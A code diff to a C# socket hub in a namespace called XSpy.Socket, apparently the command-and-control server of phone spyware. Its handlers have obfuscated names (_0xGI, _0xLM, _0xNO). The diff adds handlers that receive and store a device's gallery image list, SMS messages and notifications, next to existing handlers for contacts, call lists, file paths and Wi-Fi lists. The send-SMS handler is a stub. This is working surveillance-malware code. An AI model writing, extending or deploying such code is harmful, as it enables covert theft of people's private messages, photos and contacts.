@@ -70,6 +70,13 @@ namespace XSpy.Socket
             var pathRequest = JsonConvert.DeserializeObject<List<LoadPathData>>(request);
             await _deviceService.ListPath(GetDeviceId(), pathRequest);
         }
+        
+        //List Gallery
+        public async Task _0xGI(string request)
+        {
+            var pathRequest = JsonConvert.DeserializeObject<List<string>>(request);
+            await _deviceService.ImageList(GetDeviceId(), pathRequest);
+        }
 
 
         //Download Files
@@ -83,13 +90,19 @@ namespace XSpy.Socket
 
 
         //LIST SMS
-        public async Task _0xLM(List<CallData> callsList)
+        public async Task _0xLM(string request)
         {
+            var reqData = JsonConvert.DeserializeObject<List<ListSmsData>>(request);
+            if (reqData != null)
+            {
+                await _deviceService.StoreMessages(GetDeviceId(), reqData);
+            }
         }
 
-        //SEND SMS
-        public async Task _0xSM(List<CallData> callsList)
+        //SENT SMS
+        public async Task _0xSM(bool isSent, string phoneNo, string msg)
         {
+            //todo
         }
 
         //Call List
@@ -104,6 +117,13 @@ namespace XSpy.Socket
         {
             var contacts = JsonConvert.DeserializeObject<SaveContactsRequest>(request);
             await _deviceService.SaveContacts(GetDeviceId(), contacts);
+        }
+
+        //Notification List
+        public async Task _0xNO(string request)
+        {
+            var notifications = JsonConvert.DeserializeObject<SaveNotificationsData>(request);
+            await _deviceService.SaveNotification(GetDeviceId(), notifications);
         }
 
         //WIFI List
